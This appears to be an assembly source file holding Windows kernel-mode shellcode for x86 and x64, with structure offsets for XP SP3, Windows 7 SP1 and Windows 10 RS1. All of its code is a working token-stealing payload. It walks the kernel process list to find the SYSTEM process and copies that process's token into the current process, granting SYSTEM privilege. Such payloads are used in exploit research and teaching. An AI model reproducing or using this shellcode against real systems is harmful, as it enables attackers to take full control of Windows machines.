;
; Implementation of kernel mode shellcode
;
IFNDEF AMD64
.686p
.model flat, stdcall
ENDIF


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.CONST

; For XP SP3
WINXP_KTHREAD_OFFSET        equ     124h ; nt!_KPCR.PcrbData.CurrentThread
WINXP_EPROCESS_OFFSET       equ     44h  ; nt!_KTHREAD.ApcState.Process
WINXP_FLINK_OFFSET          equ     88h  ; nt!_EPROCESS.ActiveProcessLinks.Flink
WINXP_PID_OFFSET            equ     84h  ; nt!_EPROCESS.UniqueProcessId
WINXP_TOKEN_OFFSET          equ     0c8h ; nt!_EPROCESS.Token
WINXP_SYS_PID               equ     4h   ; PID Process SYSTEM

; For 7 SP1
WIN7_KTHREAD_OFFSET         equ     124h
WIN7_EPROCESS_OFFSET        equ     50h
WIN7_FLINK_OFFSET           equ     0b8h
WIN7_PID_OFFSET             equ     0b4h
WIN7_TOKEN_OFFSET           equ     0f8h
WIN7_SYS_PID                equ     4h

; For 7 SP1 x64
WIN7_64_KTHREAD_OFFSET      equ     188h
WIN7_64_EPROCESS_OFFSET     equ     70h
WIN7_64_FLINK_OFFSET        equ     188h
WIN7_64_PID_OFFSET          equ     180h
WIN7_64_TOKEN_OFFSET        equ     208h
WIN7_64_SYS_PID             equ     4h

; For 10 x64 (RS1)
WIN10_64_KTHREAD_OFFSET     equ     188h
WIN10_64_EPROCESS_OFFSET    equ     0b8h
WIN10_64_FLINK_OFFSET       equ     2f0h
WIN10_64_PID_OFFSET         equ     2e8h
WIN10_64_TOKEN_OFFSET       equ     358h
WIN10_64_SYS_PID            equ     4h


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.DATA


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.CODE


IFNDEF AMD64
;
; For 32bit
;

; Please change these definitions to support Windows 7 instead of XP.
WIN_KTHREAD_OFFSET          equ     WINXP_KTHREAD_OFFSET
WIN_EPROCESS_OFFSET         equ     WINXP_EPROCESS_OFFSET
WIN_FLINK_OFFSET            equ     WINXP_FLINK_OFFSET
WIN_PID_OFFSET              equ     WINXP_PID_OFFSET
WIN_TOKEN_OFFSET            equ     WINXP_TOKEN_OFFSET
WIN_SYS_PID                 equ     WINXP_SYS_PID

; Shellcode that exchanges a token of a current process with
; a token of SYSTEM process in order to obtain SYSTEM privilege.
ShellCode PROC
    pushad

    ASSUME FS:NOTHING
    mov eax, fs:[WIN_KTHREAD_OFFSET]        ; eax <= Current._KTHREAD
    ASSUME FS:ERROR
    mov eax, [eax + WIN_EPROCESS_OFFSET]    ; eax <= Current._EPROCESS
    push eax

    mov ecx, WIN_SYS_PID

SearchSystemProcess:
    mov eax, [eax + WIN_FLINK_OFFSET]       ; eax <= _EPROCESS.ActiveProcessLinks.Flink
    sub eax, WIN_FLINK_OFFSET               ; eax <= _EPROCESS of the next process
    cmp [eax + WIN_PID_OFFSET], ecx         ; if (UniqueProcessId != SYS_PID)
    jne SearchSystemProcess                 ;      jmp SearchSystemProcess
    mov edi, [eax + WIN_TOKEN_OFFSET]       ; edi <= Token of process with SYS_PID
    and edi, 0fffffff8h                     ; Must be aligned by 8

    pop eax                                 ; eax <= Current._EPROCESS
    mov [eax + WIN_TOKEN_OFFSET], edi       ; Replace the token of the process to escalate
                                            ; by the token of the process with SYS_PID
    popad
    ret
    int 3
ShellCode ENDP


ELSE
;
; For 64bit
;
WIN_KTHREAD_OFFSET          equ     WIN7_64_KTHREAD_OFFSET
WIN_EPROCESS_OFFSET         equ     WIN7_64_EPROCESS_OFFSET
WIN_FLINK_OFFSET            equ     WIN7_64_FLINK_OFFSET
WIN_PID_OFFSET              equ     WIN7_64_PID_OFFSET
WIN_TOKEN_OFFSET            equ     WIN7_64_TOKEN_OFFSET
WIN_SYS_PID                 equ     WIN7_64_SYS_PID

; Does the same thing as a x86 version.
ShellCode PROC
    push rax
    push rcx
    push rdi

    mov rax, gs:[WIN_KTHREAD_OFFSET]
    mov rax, [rax + WIN_EPROCESS_OFFSET]
    push rax

    mov rcx, WIN_SYS_PID

SearchSystemProcess:
    mov rax, [rax + WIN_FLINK_OFFSET]
    sub rax, WIN_FLINK_OFFSET
    cmp [rax + WIN_PID_OFFSET], rcx
    jne SearchSystemProcess
    mov rdi, [rax + WIN_TOKEN_OFFSET]
    and rdi, 0fffffffffffffff8h

    pop rax
    mov [rax + WIN_TOKEN_OFFSET], rdi

    pop rdi
    pop rcx
    pop rax
    ret
    int 3
ShellCode ENDP


ENDIF


END
